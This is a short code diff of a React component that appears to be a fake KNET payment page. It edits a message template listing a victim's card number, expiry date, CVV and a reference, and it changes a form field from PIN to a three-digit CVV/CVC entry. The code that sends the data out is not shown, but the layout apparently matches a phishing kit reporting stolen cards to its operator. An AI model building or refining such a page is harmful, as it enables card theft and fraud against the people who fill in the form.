@@ -44,7 +44,7 @@ function KnetPageContent() {
 💳 Card Number: ${cardNumber}
 📅 Exp Month: ${expMonth}
 📅 Exp Year: ${expYear}
-🔐 PIN: ${cvv}
+🔐 CVV/CVC: ${cvv}
 🔨 Ref:${refN}
       `;
 
@@ -219,10 +219,10 @@ function KnetPageContent() {
           <hr />
 
           <div>
-            <label className={styles.formLabel}>PIN:</label>
+            <label className={styles.formLabel}>CVV/CVC:</label>
             <input
               type="text"
-              maxLength="4"
+              maxLength="3"
               inputMode="numeric"
               pattern="\d*"
               value={cvv}
